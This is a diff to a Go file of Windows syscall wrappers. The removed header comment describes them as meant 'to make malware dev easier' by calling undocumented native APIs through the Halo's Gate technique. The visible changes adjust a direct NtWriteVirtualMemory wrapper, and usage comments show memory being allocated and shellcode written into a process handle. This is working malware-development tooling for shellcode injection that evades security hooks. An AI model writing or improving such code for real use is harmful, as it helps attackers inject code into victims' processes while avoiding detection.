@@ -5,14 +5,6 @@ import (
   "unsafe"
 )
 
-/*
-
-Function wrappers to make malware dev easier
-because they use native undocumented API functions
-with Halo's Gate technique to provide an easier implementation
-
-*/
-
 // addr, err := VirtualAlloc(pHandle, 0, uintptr(len(shellcode)), windows.MEM_COMMIT | windows.MEM_RESERVE, windows.PAGE_READWRITE)
 func VirtualAlloc(handle uintptr, zero uintptr, regionsize uintptr, allocType uintptr, allocProtection uintptr) (uintptr, error) {
 
@@ -66,7 +58,7 @@ func VirtualProtect(pHandle uintptr, addr uintptr, regionsize uintptr, newProtec
 }
 
 // err := WriteProcessMemory(pHandle, addr, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
-func WriteProcessMemory(pHandle uintptr, addr uintptr, buffer uintptr, buffer_len uintptr) (error) {
+func WriteProcessMemory(pHandle uintptr, addr uintptr, buffer uintptr, buffer_len uintptr, num_bytes uintptr) (error) {
 
   // Get syscall
   sysId, err := GetSysId("NtWriteVirtualMemory")
@@ -74,22 +66,20 @@ func WriteProcessMemory(pHandle uintptr, addr uintptr, buffer uintptr, buffer_le
     return err
   }
 
-  var bytesWritten uint32
-  r, _ := Syscall(
+  r, err := Syscall(
     sysId,
     uintptr(pHandle),
     uintptr(addr),
     uintptr(buffer),
     uintptr(buffer_len),
-    uintptr(unsafe.Pointer(&bytesWritten)),
+    uintptr(num_bytes),
   )
 
-  if (r != 0) {
+  if (r != 0) || (err != nil) {
     return errors.New("NtWriteVirtualMemory syscall returned non-zero error code")
   }
 
   return nil
 }
-
 
 
